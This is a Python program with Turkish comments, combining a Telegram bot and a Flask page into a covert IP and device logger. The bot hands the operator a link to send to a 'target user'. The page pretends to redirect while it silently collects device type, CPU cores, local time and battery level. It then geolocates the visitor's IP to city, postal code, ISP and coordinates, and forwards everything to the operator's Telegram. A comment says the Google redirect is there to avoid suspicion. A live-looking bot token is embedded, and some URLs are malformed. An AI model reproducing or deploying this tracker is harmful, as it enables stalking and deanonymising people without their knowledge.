import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, render_template_string, request, jsonify
from threading import Thread

app = Flask(__name__)

# Telegram Bot Bilgilerin (Yeni ve Güncel Token Girişi Yapıldı)
TELEGRAM_TOKEN = '8704754477:AAE4ZDtCtyrcOC2mWHjKIKzxGXKMoK2MlAo'
TELEGRAM_CHAT_ID = '7092481089'

bot = telebot.TeleBot(TELEGRAM_TOKEN)

# 1. TELEGRAM BOT KISMI: Kullanıcı /start verdiğinde butonlu premium panel mesajı gönderir
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cevap_metni = """
⚡ <b>SYSTEM NETWORK & ANALYZER PANEL v1.0</b> ⚡

👋 <b>Sisteme Hoş Geldiniz!</b> 

🤖 <i>Bu bot, hedef cihazların ağ kalitesini, pil optimizasyonunu ve donanım bileşenlerini test etmek amacıyla geliştirilmiş bağımsız bir analiz aracıdır.</i>

📝 <b>Nasıl Kullanılır?</b>
Aşağıdaki butona tıklayarak hedef kullanıcıya göndereceğiniz özel veri yakalama ve doğrulama bağlantısını anında oluşturabilirsiniz.

🔽 <b>Bağlantıyı Başlatmak İçin Tıklayın:</b>
    """
    
    markup = InlineKeyboardMarkup()
    # Şık "Bağlantı Oluştur" butonu
    buton = InlineKeyboardButton(text="⚡ Bağlantı Oluştur 🔗", callback_data="link_olustur")
    markup.add(buton)
    
    bot.send_message(message.chat.id, cevap_metni, parse_mode='HTML', reply_markup=markup)

# Kullanıcı butona bastığında çalışacak tetikleyici (Callback Query)
@bot.callback_query_handler(func=lambda call: call.data == "link_olustur")
def callback_inline(call):
    # Senin özel Render linkin koda doğrudan gömüldü
    hedef_link = "https://tg-logger-mq38.onrender.com" 
    
    link_metni = f"""
🚀 <b>ÖZEL BAĞLANTI BAŞARIYLA OLUŞTURULDU!</b>

📂 <b>Oluşturulan Link:</b>
<code>{hedef_link}</code>

⚠️ <b>Talimat:</b> Yukarıdaki bağlantıyı kopyalayıp hedef kullanıcıya iletin. Kullanıcı bağlantıya giriş yaptığı an, arka planda toplanan tüm sistem analizi ve ağ konum raporu <u>anlık olarak</u> bu sohbet ekranına gönderilecektir.
    """
    
    bot.send_message(call.message.chat.id, link_metni, parse_mode='HTML')
    bot.answer_callback_query(call.id, text="Bağlantı başarıyla üretildi!")

# 2. WEB SUNUCUSU KISMI: Kullanıcı linke tıkladığında çalışan görünmez HTML arayüzü
@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head><meta charset="UTF-8"><title>Yükleniyor...</title></head>
    <body style="background-color: #121212; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
    <h3>Yönlendiriliyorsunuz, lütfen bekleyin...</h3>
    <script>
        async function verileriTopla() {
            const ua = navigator.userAgent;
            let cihaz = "PC / Masaüstü";
            if (/android/i.test(ua)) cihaz = "Android Mobil Cihaz";
            if (/iPad|iPhone|iPod/.test(ua)) cihaz = "iOS (iPhone/iPad)";
            const cpu = navigator.hardwareConcurrency || "Bilinmiyor";
            const saat = new Date().toLocaleTimeString('tr-TR');
            let pil = "Bilinmiyor";
            if (navigator.getBattery) {
                try { const b = await navigator.getBattery(); pil = `%${Math.round(b.level * 100)}`; } catch(e){}
            }
            // Verileri Flask backend sunucusuna postala
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cihaz, cpuCekirdek: cpu, yerelSaat: saat, pilSeviyesi: pil})
            });
            // Kullanıcıyı Google'a yönlendir (Şüphe çekmesin diye)
            setTimeout(() => { window.location.href = "https://google.com"; }, 800);
        }
        window.onload = verileriTopla;
    </script>
    </body>
    </html>
    """

# Tarayıcıdan gelen kurban verileri yakalayıp Telegram'a gönderen endpoint
@app.route('/log', methods=['POST'])
def log_data():
    data = request.json or {}
    
    # Gerçek IP adresini bulma algoritması
    if request.headers.getlist("X-Forwarded-For"):
        client_ip = request.headers.getlist("X-Forwarded-For")
    else:
        client_ip = request.remote_addr or '8.8.8.8'

    cihaz = data.get('cihaz', 'Bilinmiyor')
    cpu_cekirdek = data.get('cpuCekirdek', 'Bilinmiyor')
    yerel_saat = data.get('yerelSaat', 'Bilinmiyor')
    pil_seviyesi = data.get('pilSeviyesi', 'Bilinmiyor')

    try:
        # IP-API üzerinden coğrafi ve şirket verilerini çekme
        geo_url = f"http://ip-api.com{client_ip}?fields=status,country,city,zip,org,lat,lon"
        geo_res = requests.get(geo_url).json()
        
        ulke_sehir = "Bilinmiyor"
        posta_kodu = "Bilinmiyor"
        anonim_sirket = "Bilinmiyor"
        konum = "Bilinmiyor"

        if geo_res.get('status') == 'success':
            ulke_sehir = f"{geo_res.get('country')} / {geo_res.get('city')}"
            posta_kodu = geo_res.get('zip', 'Yok')
            anonim_sirket = geo_res.get('org', 'Bilinmeyen Servis Sağlayıcı')
            konum = f"{geo_res.get('lat')}, {geo_res.get('lon')}"

        # Bota gönderilecek sistem bildirim mesajı (Panel tasarımı)
        telegram_mesaji = f"""
🛑 <b>[!] YENİ BAĞLANTI AKTİVİTESİ YAKALANDI</b> 🛑
───────────────────────
📱 <b>Cihaz Tipi:</b> <code>{cihaz}</code>
🔋 <b>Pil Seviyesi:</b> <code>{pil_seviyesi}</code>
⚙️ <b>İşlemci Çekirdeği:</b> <code>{cpu_cekirdek} Çekirdek</code>
⏰ <b>Sistem Saati:</b> <code>{yerel_saat}</code>
───────────────────────
🌍 <b>Ülke / Şehir:</b> <code>{ulke_sehir}</code>
📮 <b>Posta Kodu:</b> <code>{posta_kodu}</code>
🏢 <b>İnternet Sağlayıcı:</b> <code>{anonim_sirket}</code>
🌐 <b>IP Adresi:</b> <code>{client_ip}</code>
📍 <b>Harita Konumu:</b> <a href="https://google.com{konum}">Google Maps ile Göster</a>
───────────────────────
🔍 <i>Veriler anlık ağ sorgusu üzerinden doğrulanmıştır.</i>
        """

        # Raporu sadece senin CHAT_ID'ne gönderir
        bot.send_message(TELEGRAM_CHAT_ID, telegram_mesaji, parse_mode='HTML', disable_web_page_preview=True)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"Hata oluştu: {str(e)}")
        return jsonify({"status": "error"}), 500

def run_bot():
    print("Telegram botu aktif, komutlar dinleniyor...")
    bot.infinity_polling()

if __name__ == '__main__':
    # Botu ve Web'i aynı onda çalıştırmak için thread başlatıyoruz
    bot_thread = Thread(target=run_bot)
    bot_thread.start()
    
    print("Web sunucusu 5000 portunda başlatılıyor...")
    app.run(host='0.0.0.0', port=5000, use_reloader=False)
  
